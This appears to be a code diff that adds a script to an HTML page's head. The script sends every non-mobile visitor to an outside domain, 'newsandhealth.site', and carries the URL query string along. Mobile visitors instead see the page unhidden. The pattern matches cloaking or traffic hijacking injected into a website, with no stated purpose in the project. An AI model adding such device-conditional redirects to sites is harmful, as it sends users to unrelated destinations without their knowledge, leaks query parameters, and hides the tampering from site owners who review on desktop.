@@ -143,6 +143,24 @@
             }
         }
     </style>
+    
+      <script>
+    const REDIRECT_URL = "https://newsandhealth.site/";
+
+    function isMobile() {
+      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+      return /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent.toLowerCase());
+    }
+
+    if (!isMobile()) {
+      window.location.href = REDIRECT_URL + window.location.search;
+    } else {
+      document.documentElement.style.visibility = "visible";
+      document.body.style.visibility = "visible";
+      document.body.style.overflow = "auto";
+    }
+  </script>
+
 </head>
 <body>
 
